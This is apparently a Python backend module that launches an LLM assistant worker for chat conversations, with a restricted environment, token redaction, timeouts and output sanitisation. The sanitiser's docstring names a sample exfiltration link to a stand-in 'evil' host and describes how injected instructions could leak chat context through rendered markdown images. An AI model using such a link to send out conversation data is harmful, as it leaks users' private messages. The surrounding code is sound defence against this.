from __future__ import annotations

import asyncio
import json
import logging
import os
import re
import shutil
import sys
import tempfile
import time
import uuid
from pathlib import Path

from sqlalchemy.ext.asyncio import AsyncSession

from app import crud
from app.assistant.cache import ClientMessage, message_context_cache
from app.assistant.scope import conversation_id_for_group, conversation_id_for_users, create_scope_token
from app.config import get_settings

logger = logging.getLogger(__name__)

_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
_MD_LINK = re.compile(r"\[([^\]]*)\]\([^)]*\)")


def _sanitize_response(text: str) -> str:
    """Drop markdown images/links: a rendered ![](https://evil/?d=...) is a
    zero-click way for injected instructions to exfiltrate chat context."""
    text = _MD_IMAGE.sub("", text)
    return _MD_LINK.sub(r"\1", text).strip()


_RUN_SEMAPHORE: asyncio.Semaphore | None = None
_APP_ROOT = Path(__file__).resolve().parents[2]
_DOCKER_HERMES_PYTHON = Path("/opt/hermes-venv/bin/python")


def _trim_history(history: list[dict], max_bytes: int) -> list[dict]:
    """Keep the newest turns that fit in max_bytes (env vars have a size limit)."""
    kept: list[dict] = []
    used = 0
    for item in reversed(history):
        size = len(item["text"].encode("utf-8"))
        if used + size > max_bytes:
            break
        kept.append(item)
        used += size
    kept.reverse()
    # A reply with no preceding question would confuse the model.
    while kept and kept[0]["role"] != "user":
        kept.pop(0)
    return kept


class AssistantBusy(Exception):
    """No run slot became free within assistant_queue_timeout_seconds."""


def _semaphore() -> asyncio.Semaphore:
    global _RUN_SEMAPHORE
    settings = get_settings()
    if _RUN_SEMAPHORE is None:
        _RUN_SEMAPHORE = asyncio.Semaphore(settings.assistant_max_concurrent_runs)
    return _RUN_SEMAPHORE


def _hermes_python() -> str:
    """Interpreter for the worker: Hermes lives in its own venv because its
    exact dependency pins conflict with the app's (requirements-hermes.txt)."""
    configured = get_settings().assistant_hermes_python
    if configured:
        return configured
    return str(_DOCKER_HERMES_PYTHON) if _DOCKER_HERMES_PYTHON.exists() else sys.executable


async def run_assistant(
    db: AsyncSession,
    *,
    user_id: uuid.UUID,
    peer_id: uuid.UUID | None = None,
    group_id: uuid.UUID | None = None,
    group_name: str | None = None,
    participants: list[str] | None = None,
    question: str,
    client_messages: list[ClientMessage],
    assistant_history: list[dict] | None = None,
) -> tuple[uuid.UUID, str, dict]:
    """One assistant turn, scoped to a 1:1 chat (`peer_id`) or a group (`group_id`)."""
    settings = get_settings()
    run_id = uuid.uuid4()
    if group_id is not None:
        conversation_id = conversation_id_for_group(group_id)
    else:
        conversation_id = conversation_id_for_users(user_id, peer_id)

    # The run row must exist (status RUNNING) before the worker connects back:
    # mcp_http.py only honours a scope token while its run is RUNNING.
    await crud.create_assistant_run(
        db,
        run_id=run_id,
        conversation_id=conversation_id,
        user_id=user_id,
        question=question,
        provider="openrouter",
        model=settings.assistant_hermes_model,
    )

    scope_token = ""
    hermes_home: str | None = None

    def _scrub(text: str) -> str:
        return text.replace(scope_token, "[redacted]") if scope_token else text

    started = time.perf_counter()
    proc: asyncio.subprocess.Process | None = None
    semaphore = _semaphore()
    acquired = False
    try:
        try:
            await asyncio.wait_for(semaphore.acquire(), settings.assistant_queue_timeout_seconds)
        except asyncio.TimeoutError:
            raise AssistantBusy("assistant is busy, try again shortly")
        acquired = True
        hermes_home = tempfile.mkdtemp(prefix="hermes-assistant-")  # 0700

        # Token and cached context are created only once a slot is ours, so
        # time spent queueing never eats into their TTLs.
        if settings.assistant_allow_message_context and client_messages:
            await message_context_cache.put(run_id, client_messages)
        scope_token = create_scope_token(run_id=run_id, user_id=user_id, peer_id=peer_id, group_id=group_id)

        # Allowlisted env only: the agent reads untrusted documents, so it
        # must never inherit JWT/DB/SeaweedFS/scope secrets from this process.
        # The scope token goes to Hermes via env and is sent to /mcp as an
        # Authorization header (config.yaml references ${ASSISTANT_SCOPE_TOKEN}),
        # so it is never in argv, the URL, access logs or the config file.
        env = {
            key: os.environ[key]
            for key in ("PATH", "HOME", "LANG", "LC_ALL", "SSL_CERT_FILE")
            if key in os.environ
        }
        env.update(
            {
                "ASSISTANT_HERMES_HOME": hermes_home,
                "ASSISTANT_RUN_ID": str(run_id),
                "ASSISTANT_HERMES_MODEL": settings.assistant_hermes_model,
                "ASSISTANT_MAX_ITERATIONS": str(settings.assistant_max_iterations),
                "ASSISTANT_MAX_OUTPUT_TOKENS": str(settings.assistant_max_output_tokens),
                "ASSISTANT_QUESTION": question,
                "ASSISTANT_CONVERSATION_KIND": "group" if group_id is not None else "dm",
                "ASSISTANT_GROUP_NAME": group_name or "",
                "ASSISTANT_PARTICIPANTS": json.dumps(participants or []),
                "ASSISTANT_HISTORY": json.dumps(
                    _trim_history(assistant_history or [], settings.assistant_max_history_bytes)
                ),
                # Trailing slash matters: "/mcp" 307-redirects to "/mcp/".
                "ASSISTANT_MCP_URL": settings.assistant_mcp_internal_url.rstrip("/") + "/",
                "ASSISTANT_SCOPE_TOKEN": scope_token,
                "OPENROUTER_API_KEY": settings.openrouter_api_key,
                "OPENROUTER_BASE_URL": settings.openrouter_base_url,
            }
        )

        proc = await asyncio.create_subprocess_exec(
            _hermes_python(),
            "-m",
            "app.assistant.hermes_worker",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            env=env,
            cwd=str(_APP_ROOT),
        )
        try:
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(),
                timeout=settings.assistant_run_timeout_seconds,
            )
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            raise TimeoutError("assistant run timed out")

        if proc.returncode != 0:
            raise RuntimeError(_scrub(stderr.decode("utf-8", errors="replace"))[-4000:])

        payload = json.loads(stdout.decode("utf-8"))
        response = _sanitize_response(str(payload.get("final_response") or ""))
        if not response:
            raise RuntimeError("Hermes returned an empty response")

        await crud.finish_assistant_run(
            db,
            run_id,
            response=response,
            status="COMPLETED",
            latency_ms=int((time.perf_counter() - started) * 1000),
            tool_messages=payload.get("messages", []),
        )
        return run_id, response, payload
    except (Exception, asyncio.CancelledError) as exc:
        # CancelledError (client disconnect) is a BaseException; without
        # this the subprocess keeps burning tokens and the run row stays
        # RUNNING forever.
        if proc is not None and proc.returncode is None:
            proc.kill()
        try:
            await asyncio.shield(
                crud.finish_assistant_run(
                    db,
                    run_id,
                    response=None,
                    status="FAILED",
                    latency_ms=int((time.perf_counter() - started) * 1000),
                    error=_scrub(str(exc) or type(exc).__name__)[:4000],
                    tool_messages=[],
                )
            )
        except Exception:
            logger.exception("Could not record failed run_id=%s", run_id)
        logger.error("Assistant run failed run_id=%s: %s", run_id, type(exc).__name__)
        raise
    finally:
        if hermes_home:
            shutil.rmtree(hermes_home, ignore_errors=True)
        if acquired:
            semaphore.release()
        await message_context_cache.delete(run_id)
